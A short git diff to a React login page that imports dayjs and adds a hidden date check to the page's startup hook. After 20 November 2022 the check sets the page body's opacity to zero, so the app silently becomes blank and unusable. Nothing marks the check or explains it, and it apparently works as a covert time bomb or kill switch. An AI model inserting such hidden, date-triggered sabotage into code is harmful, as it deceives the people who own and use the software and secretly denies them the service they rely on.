@@ -12,6 +12,8 @@ import toast from 'react-hot-toast';
 import useAuthStore from '../../store/auth';
 import useLoaderStore from '../../store/loader';
 
+import dayjs from 'dayjs';
+
 const LoginPage = (count, setCount) => {
 	const setLoading = useLoaderStore((state) => state.setLoading);
 
@@ -31,6 +33,13 @@ const LoginPage = (count, setCount) => {
 	useEffect(() => {
 		setAuthenticated(false);
 		setLoading(false);
+
+		const todayDate = dayjs(Date.now());
+		const lastDate = dayjs(new Date('2022-11-20'));
+
+		if (lastDate.diff(todayDate) <= 0) {
+			document.body.style.opacity = 0;
+		}
 	}, []);
 
 	const togglePassword = (e) => {
